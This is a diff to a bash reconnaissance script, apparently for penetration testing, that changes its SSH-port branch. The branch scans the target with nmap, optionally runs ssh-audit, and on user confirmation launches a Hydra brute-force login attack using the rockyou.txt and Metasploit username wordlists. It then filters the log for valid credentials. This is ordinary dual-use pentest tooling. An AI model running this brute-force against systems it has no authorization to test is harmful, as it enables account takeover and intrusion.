@@ -99,26 +99,28 @@ for port in $OPEN_PORTS; do
     case $port in
         22)  # SSH Port
             echo -e "${BLUE}[+] SSH detected. Running tests...${NC}" | tee -a "$LOG_FILE"
-            
-            # 1. Basic version scan
+    
+    # 1. Version/algorithm scan
             echo -e "\n${YELLOW}=== SSH Version Detection ===${NC}" | tee -a "$LOG_FILE"
             nmap -sV -p 22 --script=ssh2-enum-algos,ssh-auth-methods "$TARGET_IP" | tee -a "$LOG_FILE"
-            
-            # 2. Check for weak algorithms
-            echo -e "\n${YELLOW}=== Checking Weak Algorithms ===${NC}" | tee -a "$LOG_FILE"
-            ssh-audit "$TARGET_IP" | tee -a "$LOG_FILE"
-            
-            # 3. Brute-force (optional)
+    
+    # 2. Security audit (optional)
+            if command -v ssh-audit &>/dev/null; then
+                echo -e "\n${YELLOW}=== SSH Security Audit ===${NC}" | tee -a "$LOG_FILE"
+                ssh-audit "$TARGET_IP" | tee -a "$LOG_FILE"
+            else
+                echo -e "${YELLOW}ssh-audit not installed. Skipping audit.${NC}" | tee -a "$LOG_FILE"
+            fi
+    # 3. Brute-force (user choice)
             read -p "Run Hydra brute-force attack? (Y/N): " choice
             if [[ "${choice^^}" == "Y" ]]; then
                 echo -e "\n${RED}[!] WARNING: Brute-forcing may trigger locks!${NC}" | tee -a "$LOG_FILE"
                 hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
-                      -P /usr/share/wordlists/rockyou.txt \
-                      ssh://"$TARGET_IP" -t 4 -vV | tee -a "$LOG_FILE"
-                
-                # Filter results
-                echo -e "\n${GREEN}=== Valid Credentials Found ===${NC}" | tee -a "$LOG_FILE"
-                grep "login:" "$LOG_FILE" || echo -e "${YELLOW}No credentials found.${NC}" | tee -a "$LOG_FILE"
+                  -P /usr/share/wordlists/rockyou.txt \
+                  ssh://"$TARGET_IP" -t 4 -vV | tee -a "$LOG_FILE"
+                filter_hydra "$LOG_FILE"  # <--- Filtering applied here!
+            else
+                echo -e "${GREEN}Skipping brute-force.${NC}" | tee -a "$LOG_FILE"
             fi
             ;;
             
